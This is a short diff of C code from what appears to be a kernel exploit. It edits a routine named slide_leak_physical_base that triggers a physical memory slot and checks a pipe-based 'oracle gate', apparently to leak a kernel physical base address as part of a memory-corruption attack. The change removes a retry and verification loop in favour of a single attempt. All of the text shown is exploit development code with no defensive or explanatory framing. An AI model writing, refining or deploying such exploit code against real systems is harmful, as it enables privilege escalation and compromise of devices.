@@ -2764,50 +2764,9 @@ static int slide_leak_physical_base(void) {
 #endif
       continue;
     }
-    int gate_triggered = 0;
-    int gate_result = 0;
-#ifdef APP_P0_GATE_ATTEMPTS
-    int gate_attempts = APP_P0_GATE_ATTEMPTS;
-#else
-    int gate_attempts = 1;
-#endif
-#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
-    APP_FOPS_REWRITE_RECLAIMED_PAGE
-    if (app_fops_page_reuse_enabled()) {
-      gate_attempts = 1;
-    }
-#endif
-    for (int gate_attempt = 1; gate_attempt <= gate_attempts;
-         gate_attempt++) {
-      size_t gate_slot = P0_ORACLE_GATE_SLOT;
-#if defined(P0_ORACLE_GATE_RETRY_SLOT)
-      if (gate_attempt > 1) {
-        gate_slot = P0_ORACLE_GATE_RETRY_SLOT;
-      }
-#endif
-      gate_triggered = slide_trigger_physical_slot_reliable(gate_slot);
-      int gate_peek = peek_p0_pipe_oracle_gate();
-      pr_info("p0 gate attempt=%d/%d slot=%zu triggered=%d peek=%d\n",
-              gate_attempt, gate_attempts, gate_slot,
-              gate_triggered, gate_peek);
-      if (gate_peek == 0 && gate_attempt < gate_attempts) {
-        continue;
-      }
-      if (gate_peek == -2) {
-        pr_warning("p0 gate snapshot uncertain; refusing consume/retry\n");
-        app_publish_p0_dirty();
-        return 0;
-      }
-      if (gate_peek != 0) {
-        gate_result = verify_p0_pipe_oracle_gate();
-        if (gate_result != gate_peek) {
-          pr_warning("p0 gate peek/consume mismatch peek=%d result=%d\n",
-                     gate_peek, gate_result);
-          gate_result = -1;
-        }
-      }
-      break;
-    }
+    int gate_triggered =
+        slide_trigger_physical_slot_reliable(P0_ORACLE_GATE_SLOT);
+    int gate_result = verify_p0_pipe_oracle_gate();
     pr_info("p0 fresh page triggered=%d result=%d attempt=%d/%d\n",
             gate_triggered, gate_result, fresh_attempt, fresh_page_attempts);
     if (getenv("P0_ORACLE_GATE_DIAG")) {
